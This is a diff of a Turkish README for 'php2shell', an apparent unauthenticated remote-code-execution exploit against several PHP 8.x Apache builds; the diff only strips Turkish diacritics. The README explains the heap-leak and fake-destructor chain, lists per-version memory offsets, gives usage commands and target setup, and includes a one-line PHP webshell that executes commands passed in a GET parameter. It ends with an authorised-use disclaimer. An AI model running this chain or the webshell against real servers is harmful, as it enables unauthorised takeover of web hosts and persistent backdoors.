@@ -217,50 +217,50 @@ crime in most jurisdictions.
 ---
 ---
 
-# php2shell — kimlik doğrulamasız RCE (PHP 8.3.33 / 8.3.35 / 8.4.26 / 8.5.11)
+# php2shell — kimlik dogrulamasiz RCE (PHP 8.3.33 / 8.3.35 / 8.4.26 / 8.5.11)
 
 **CVE-2026-109618 / CVE-2026-109619** · [EDB-52704](https://www.exploit-db.com/exploits/52704)
 
 Standart `php:<ver>-apache` konteynerlerinde **`www-data` (`uid=33`) olarak
-kimlik doğrulamasız uzaktan kod çalıştıran** tek, bağımsız (self-contained)
-Python dosyası. Üçüncü parti bağımlılık yok — yalnızca stdlib.
+kimlik dogrulamasiz uzaktan kod calistiran** tek, bagimsiz (self-contained)
+Python dosyasi. Ucuncu parti bagimlilik yok — yalnizca stdlib.
 
-> Araştırma: çekirdek zincir **9bie** ve **eness**, ayarlar **OffSec**;
-> sürüm kalibrasyonları **devploit/php2shell** ile çapraz doğrulandı.
-> Bu dosya o zinciri tek script içinde yeniden uygular.
+> Arastirma: cekirdek zincir **9bie** ve **eness**, ayarlar **OffSec**;
+> surum kalibrasyonlari **devploit/php2shell** ile capraz dogrulandi.
+> Bu dosya o zinciri tek script icinde yeniden uygular.
 
-## Ne yapıyor
+## Ne yapiyor
 
-Sıradan HTTP `multipart/form-data` istekleriyle (1) prefork worker'ı döndürür,
-(2) `Set-Cookie` başlığından Zend MM chunk base + `libphp.so` base'ini sızdırır,
-(3) destructor'ü `zif_system` olan sahte bir `zend_array` üretir. İstek kapanırken
-motor `zval_ptr_dtor(&PS(http_session_vars))` → `zif_system(cmd)` çağırır → **RCE**.
+Siradan HTTP `multipart/form-data` istekleriyle (1) prefork worker'i dondurur,
+(2) `Set-Cookie` basligindan Zend MM chunk base + `libphp.so` base'ini sizdirir,
+(3) destructor'u `zif_system` olan sahte bir `zend_array` uretir. Istek kapanirken
+motor `zval_ptr_dtor(&PS(http_session_vars))` → `zif_system(cmd)` cagirir → **RCE**.
 
-Varsayılan kanıt komutu: `id > /www/p1`, `GET /p1` ile okunur → `uid=33`.
+Varsayilan kanit komutu: `id > /www/p1`, `GET /p1` ile okunur → `uid=33`.
 
-## Desteklenen sürümler
+## Desteklenen surumler
 
-| PHP   | stage-3 yolu | süre* |
+| PHP   | stage-3 yolu | sure* |
 |-------|--------------|-------|
 | 8.3.33 | 9bie spray   | ~16 sn |
 | 8.3.35 | 9bie spray   | ~16 sn |
 | 8.4.26 | carrier      | ~16 sn |
 | 8.5.11 | carrier      | ~17 sn |
 
-\* canlı hedefe tek deneme; script otomatik tekrarlar (varsayılan 6).
+\* canli hedefe tek deneme; script otomatik tekrarlar (varsayilan 6).
 
-> **Bilinçli etkilendi AMA bu araçla RCE edilemeyen** (offset'ler çıkarıldı,
-> ama ne carrier ne 9bie yolu onların heap layout'una oturuyor — canlı
-> konteynerlerde exhaustive `htdata`/`s_off` taramasıyla doğrulandı):
+> **Bilincli etkilendi AMA bu aracla RCE edilemeyen** (offset'ler cikarildi,
+> ama ne carrier ne 9bie yolu onlarin heap layout'una oturuyor — canli
+> konteynerlerde exhaustive `htdata`/`s_off` taramasiyla dogrulandi):
 > **8.5.9, 8.4.24, 8.4.25, 8.5.10.** `VERSIONS` tablosunda mevcutlar (`-v`
-> kabul eder) ama RCE'ye ulaşmazlar.
+> kabul eder) ama RCE'ye ulasmazlar.
 
 ## Gereksinimler
 
 - **Python 3.9+** (pip paketi yok).
-- Aşağıdaki referans ortamıyla uyan bir hedef (kalibrasyon buna göre).
+- Asagidaki referans ortamiyla uyan bir hedef (kalibrasyon buna gore).
 
-### Referans hedef ortamı (Docker)
+### Referans hedef ortami (Docker)
 
 ```
 image      php:<ver>-apache   (Debian bookworm, Apache 2.4, mod_php, mpm_prefork)
@@ -284,7 +284,7 @@ session.upload_progress.enabled=1
 ```
 
 **`mpm_prefork.conf`** (tek worker — leak deterministik tek-thread heap'e
-bağlıdır):
+baglidir):
 ```
 <IfModule mpm_prefork_module>
     StartServers             1
@@ -300,7 +300,7 @@ bağlıdır):
 <?php session_start(); echo "OK";
 ```
 
-### Hedefi ayağa kaldırma
+### Hedefi ayaga kaldirma
 
 ```bash
 docker run -d --name p2s -p 8080:80 php:8.4.26-apache
@@ -337,75 +337,75 @@ docker exec p2s ln -sf /var/www/html /www
 docker exec p2s apache2ctl restart
 ```
 
-## Kullanım
+## Kullanim
 
 ```bash
 python3 php2shell.py -t http://127.0.0.1:8080 -v 8.4.26
 ```
 
-| Seçenek | Açıklama | Varsayılan |
+| Secenek | Aciklama | Varsayilan |
 |---------|----------|------------|
 | `-t, --target` | hedef base URL (`http://` veya `https://`) | — |
 | `-v, --version` | `8.3.35 \| 8.4.26 \| 8.5.10 \| 8.5.11` | `8.4.26` |
-| `--cmd` | çalıştırılacak komut (carrier'da ≤ 14 bayt) | `id>/www/p1` |
+| `--cmd` | calistirilacak komut (carrier'da ≤ 14 bayt) | `id>/www/p1` |
 | `--htdoc` | hedef docroot dizini | `/www` |
-| `--proof` | docroot altındaki kanıt dosyası | `p1` |
-| `--shell DOSYA` | **opsiyonel** webshell (yalnız 9bie / 8.3.35, ~200 bayt) | — |
-| `--attempts` | tam zincir deneme sayısı | `6` |
+| `--proof` | docroot altindaki kanit dosyasi | `p1` |
+| `--shell DOSYA` | **opsiyonel** webshell (yalniz 9bie / 8.3.35, ~200 bayt) | — |
+| `--attempts` | tam zincir deneme sayisi | `6` |
 
-## Nasıl çalışıyor
+## Nasil calisiyor
 
-1. **Worker rotasyonu** — HTTP ile mevcut prefork child'ı abort et; Apache temiz,
+1. **Worker rotasyonu** — HTTP ile mevcut prefork child'i abort et; Apache temiz,
    deterministik heap'li yenisini fork'lar.
-2. **Stage 1 — heap leak.** OOM/bailout, `PS(id)`'yi örten sahte 79B `zend_string`
-   bırakır; `len` overflow'u chunk header'a taşar → `Set-Cookie` heap pointer
-   sızdırır → **chunk base** (2MB hizalı).
-3. **Stage 2 — libphp leak.** Aynı teknikle `libphp.so` pointer'ı → **libphp base**
-   (4KB hizalı). `zif_system = base + zif_offset`.
+2. **Stage 1 — heap leak.** OOM/bailout, `PS(id)`'yi orten sahte 79B `zend_string`
+   birakir; `len` overflow'u chunk header'a tasar → `Set-Cookie` heap pointer
+   sizdirir → **chunk base** (2MB hizali).
+3. **Stage 2 — libphp leak.** Ayni teknikle `libphp.so` pointer'i → **libphp base**
+   (4KB hizali). `zif_system = base + zif_offset`.
 4. **Stage 3 — sahte destructor.**
-   - **8.3.35 (9bie spray):** ucuz OOM `PS(http_session_vars)`'ı sarkıtır; 995×384B
+   - **8.3.35 (9bie spray):** ucuz OOM `PS(http_session_vars)`'i sarkitir; 995×384B
      spray onu `pDestructor = zif_system` olan sahte `zend_array` ile ezer.
    - **8.4.26 / 8.5.x (carrier):** 15B bin-40 `zend_string` tam `PS(http_session_vars)`
-     üzerine iner ve 167B sahte `zend_array`'a işaret eder.
-5. **Kapanış.** `zval_ptr_dtor(&PS(http_session_vars))` sahte destructor'u çalıştırır
+     uzerine iner ve 167B sahte `zend_array`'a isaret eder.
+5. **Kapanis.** `zval_ptr_dtor(&PS(http_session_vars))` sahte destructor'u calistirir
    → `zif_system(cmd)` → `www-data` olarak komut.
 
-## Kalibrasyon (sürüm başına offset'ler)
+## Kalibrasyon (surum basina offset'ler)
 
-Tüm offset'ler görelidir (ASLR'dan bağımsız). `zif`/`dtor` `libphp.so` içi
-offset; `htdata`/`s_off` sızdırılan chunk base'e göre offset.
+Tum offset'ler gorelidir (ASLR'dan bagimsiz). `zif`/`dtor` `libphp.so` ici
+offset; `htdata`/`s_off` sizdirilan chunk base'e gore offset.
 
-| Sürüm | `zif_system` | `zval_ptr_dtor` | `htdata` | `s_off` | yol |
+| Surum | `zif_system` | `zval_ptr_dtor` | `htdata` | `s_off` | yol |
 |-------|--------------|-----------------|----------|---------|-----|
 | 8.3.35  | `0x3ac080` | `0x49ec50` | `0x690d8` | `0xF6398` | 9bie |
 | 8.4.26  | `0x465370` | `0x65eb60` | `0x690d8` | — | carrier |
 | 8.5.10  | `0x598d60` | `0x7b3860` | `0x690d8` | — | carrier |
 | 8.5.11  | `0x5996e0` | `0x7b47a0` | `0x690d8` | — | carrier |
 
-Yeni bir build için offset'leri türet:
+Yeni bir build icin offset'leri turet:
 ```bash
 docker exec p2s nm /usr/lib/apache2/modules/libphp.so | grep -wE 'zif_system|zval_ptr_dtor'
 ```
 
-## Komut uzunluğu sınırı
+## Komut uzunlugu siniri
 
-**carrier** yol komutu 167B canlı `zend_string` içine gömer → **14 bayt** sınırı
-(örn. `id>/www/p1`). **9bie** yol (8.3.35) **~200 bayt**a izin verir, bu yüzden
+**carrier** yol komutu 167B canli `zend_string` icine gomer → **14 bayt** siniri
+(orn. `id>/www/p1`). **9bie** yol (8.3.35) **~200 bayt**a izin verir, bu yuzden
 webshell de deploy edilebilir:
 
 ```bash
-# --shell, sağladığınız tek satırlık webshell dosyasını alır (içinde `<?php echo shell_exec($_GET['c']);?>`)
+# --shell, sagladiginiz tek satirlik webshell dosyasini alir (icinde `<?php echo shell_exec($_GET['c']);?>`)
 python3 php2shell.py -t http://127.0.0.1:18112 -v 8.3.35 --shell webshell.php
 ```
 
 ## Dosyalar
 
-| Dosya | Amaç |
+| Dosya | Amac |
 |-------|------|
-| `php2shell.py` | tek self-contained exploit (tüm aşamalar) |
+| `php2shell.py` | tek self-contained exploit (tum asamalar) |
 
-## Yasal / güvenlik
+## Yasal / guvenlik
 
-Bu bir güvenlik araştırması PoC'idir. Yalnızca sahip olduğunuz veya test
-etmek için açık yetkiniz olan sistemlerde çalıştırın. Yetkisiz erişim çoğu
-ülkede suçtur.
+Bu bir guvenlik arastirmasi PoC'idir. Yalnizca sahip oldugunuz veya test
+etmek icin acik yetkiniz olan sistemlerde calistirin. Yetkisiz erisim cogu
+ulkede suctur.
